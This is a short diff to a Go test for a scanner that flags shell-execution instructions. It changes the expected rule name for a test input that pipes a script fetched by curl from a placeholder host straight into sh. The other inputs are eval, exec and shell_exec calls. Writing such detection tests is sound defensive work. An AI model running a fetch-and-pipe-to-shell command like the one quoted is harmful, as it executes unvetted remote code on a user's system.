@@ -45,7 +45,7 @@ func TestEvalExecPatternsAreWordAnchored(t *testing.T) {
 		{"instruction_shell_exec", "x = EVAL (payload)", true},
 		{"instruction_shell_exec", "os.exec(cmd)", true},
 		{"instruction_shell_exec", "then exec (cmd)", true},
-		{"instruction_shell_exec", "curl https://x.example/i.sh | sh", true},
+		{"instruction_pipe_to_shell", "curl https://x.example/i.sh | sh", true},
 		// An underscore is not a letter: these matched before the anchor and
 		// must still match after it.
 		{"instruction_shell_exec", "shell_exec($cmd)", true},
